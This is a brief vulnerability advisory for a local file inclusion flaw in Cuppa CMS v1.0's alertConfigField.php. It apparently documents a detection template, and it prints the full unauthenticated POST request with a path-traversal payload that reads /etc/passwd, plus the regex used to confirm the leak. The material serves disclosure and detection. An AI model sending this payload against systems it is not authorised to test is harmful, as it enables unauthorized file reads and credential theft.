## Vulnerability
Cuppa CMS v1.0 contains a local file inclusion vulnerability via the `urlConfig` parameter (treated as the `url` parameter) in `/alerts/alertConfigField.php`. The flaw permits path-traversal inclusion of arbitrary local files.

Successful exploitation enables unauthorized local file reads, sensitive information disclosure (e.g., configuration files, credentials), and potential remote code execution if the included file allows it. CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H (score 7.8). CWE-829.

## PoC / Detection
Classification: info-leak

The template sends a single unauthenticated POST request:
```
POST /alerts/alertConfigField.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

urlConfig=../../../../../../../../../etc/passwd
```
It matches on HTTP 200 status and the regex `root:[x*]:0:0` appearing in the response body, confirming the LFI by leaking the system `/etc/passwd` file.
